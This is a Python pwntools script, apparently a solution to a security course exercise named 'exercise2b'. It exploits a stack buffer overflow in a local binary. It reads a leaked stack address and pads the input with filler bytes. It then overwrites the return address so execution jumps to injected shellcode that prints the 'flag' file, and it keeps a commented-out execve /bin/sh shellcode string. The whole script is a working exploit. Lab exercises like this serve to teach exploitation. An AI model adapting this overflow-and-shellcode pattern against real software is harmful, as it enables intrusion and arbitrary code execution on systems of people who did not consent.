#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise2b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main
b *check_authorization+50
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

address = r.recvuntil("\n")
log.info(f"Address: {address}"  )
address = address[:-1]
init_output = r.recvuntil("password:")
# print(init_output)
log.info(f"Initial data receied: {init_output}"  )

exploit = b""


# Code to inject
# system("cat flag");
# 004011b6
# 0x7fffffffdcf0 #


# Code Injection goes here
#execute = shellcraft.amd64.linux.mmap_rwx(size=64, protection=7, address=None)
execute= shellcraft.amd64.linux.cat("flag")
code = asm(execute)
# code = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
to_append = 28
exploit += b"A" * to_append 

# Alignment
exploit += b"B" * 12

# # Exploit the return 
# # Address of injected: 004011c9
# # f3 0f 1e fa  
# Little Endian
address = address[2:].decode()
addint = int(address, 16) + 48
address = hex(addint)
address = address[2:]
address = bytearray.fromhex("0000"+address)
address.reverse()

exploit+= address
exploit += code

r.sendline(exploit)

# Receive everything
output = r.recvall()
log.info(f"Final data receied: {output}"  )

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()
